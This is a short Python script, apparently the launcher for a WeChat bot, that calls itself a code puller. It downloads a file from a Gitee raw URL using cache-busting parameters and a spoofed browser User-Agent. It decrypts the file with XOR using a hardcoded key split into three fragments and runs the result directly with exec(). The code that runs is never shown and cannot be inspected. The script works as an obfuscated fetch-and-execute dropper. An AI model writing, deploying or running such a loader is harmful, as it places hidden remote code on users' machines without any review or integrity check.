#!/usr/bin/env python3
import sys
import time
import random
import string
import urllib.request
import urllib.error

GITEE_RAW_URL = "https://gitee.com/zynsync/zyn-i-link-chat-box/raw/master/ZynWechatBot.enc"

_k1 = "Zynchat"
_k2 = "NB"
_k3 = "123456"
KEY_B = _k1 + _k2 + _k3

def xor_crypt(data, key):
    key_bytes = key.encode('utf-8')
    key_len = len(key_bytes)
    result = bytearray()
    for i, byte in enumerate(data):
        result.append(byte ^ key_bytes[i % key_len])
    return bytes(result)

def fetch_file(url, timeout=10):

    timestamp = int(time.time())
    rand_str = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
    separator = '&' if '?' in url else '?'
    fresh_url = f"{url}{separator}_={timestamp}&r={rand_str}"
    
    headers = {
        'Cache-Control': 'no-cache, no-store, must-revalidate',
        'Pragma': 'no-cache',
        'Expires': '0',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    }
    
    try:
        req = urllib.request.Request(fresh_url, headers=headers)
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            if resp.status == 200:
                return resp.read()
    except Exception as e:
        print(f"拉取失败: {e}")
    return None

def main():
    print("="*50)
    print("Zynsync 代码拉取器")
    print("="*50)
    
    print(f"[1/1] 尝试拉取...", end=" ", flush=True)
    encrypted_data = fetch_file(GITEE_RAW_URL)
    if encrypted_data:
        print("成功！")
    else:
        print("失败")
        print("\n无法获取远程代码，请检查网络或Gitee地址！")
        sys.exit(1)
    
    print("正在转译...")
    try:
        decrypted = xor_crypt(encrypted_data, KEY_B)
        decrypted_str = decrypted.decode('utf-8')
        print("转译成功！正在执行...")
        print("="*40)
        exec(decrypted_str, {'__name__': '__main__'})
    except Exception as e:
        print(f"转译或执行失败: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()